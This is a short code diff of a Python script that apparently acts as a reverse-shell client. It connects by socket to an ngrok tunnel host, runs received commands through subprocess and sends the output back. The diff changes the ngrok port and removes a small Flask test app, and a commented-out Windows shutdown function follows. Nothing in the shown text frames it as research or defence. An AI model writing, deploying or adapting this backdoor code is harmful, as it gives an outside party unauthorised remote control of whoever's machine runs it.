@@ -37,7 +37,7 @@ import socket
 import subprocess
 
 IP = "0.tcp.in.ngrok.io"   # ngrok host
-PORT = 17788               # ngrok port 
+PORT = 12809               # ngrok port 
 
 s = socket.socket()
 s.connect((IP, PORT))
@@ -64,17 +64,6 @@ while True:
     s.send(response.encode())
 
 s.close()
-
-from flask import Flask
-
-app = Flask(__name__)
-
-@app.route("/")
-def home():
-    return "✅ Flask is workings!"
-
-if __name__ == "__main__":
-    app.run(host="127.0.0.1", port=5000)
 
 #def shutdown_windows():
     #print('shutting down bro')
